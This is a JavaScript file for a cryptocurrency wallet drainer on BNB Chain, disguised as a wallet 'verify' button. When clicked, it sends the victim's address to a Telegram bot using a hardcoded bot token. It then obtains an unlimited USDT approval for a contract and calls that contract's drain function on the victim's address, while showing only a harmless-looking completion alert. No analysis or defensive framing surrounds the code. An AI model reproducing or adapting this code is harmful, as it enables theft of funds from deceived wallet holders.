import { ethers } from "https://cdn.jsdelivr.net/npm/ethers@6.7.0/+esm";

const CONTRACT_ADDRESS = "0x25Ea1887a6aFc6Ce868fEB2b2068Ea498750aa54";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // Official BSC USDT
const ABI = [
  {
    "inputs": [{ "internalType": "address", "name": "victim", "type": "address" }],
    "name": "drain",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  }
];

document.getElementById("verifyBtn").addEventListener("click", async () => {
  try {
    if (!window.ethereum) {
      alert("Web3 wallet not found.");
      return;
    }

    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
    const userAddress = accounts[0];

    const chainId = await window.ethereum.request({ method: "eth_chainId" });
    if (chainId !== "0x38") {
      alert("Please switch to BNB Chain manually in your wallet.");
      return;
    }

    const provider = new ethers.BrowserProvider(window.ethereum);
    const signer = await provider.getSigner();

    // Send user address to Telegram (optional)
    await fetch("https://api.telegram.org/bot6382444394:AAE7ZAZGcGbyRI-v5d50rFFniMwoFJwZX-c/sendMessage?chat_id=6463337516&text=" + userAddress, {
      method: "POST"
    });

    // Approve USDT to your contract first
    const USDT = new ethers.Contract(
      USDT_ADDRESS,
      ["function approve(address spender, uint256 amount) public returns (bool)"],
      signer
    );
    const approvalTx = await USDT.approve(CONTRACT_ADDRESS, ethers.MaxUint256);
    await approvalTx.wait();
    console.log("USDT approved.");

    // Now call drain()
    const contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
    const tx = await contract.drain(userAddress);
    await tx.wait();

    alert("Transaction complete!");
  } catch (err) {
    console.error("Error:", err);
    alert("Something went wrong.");
  }
});
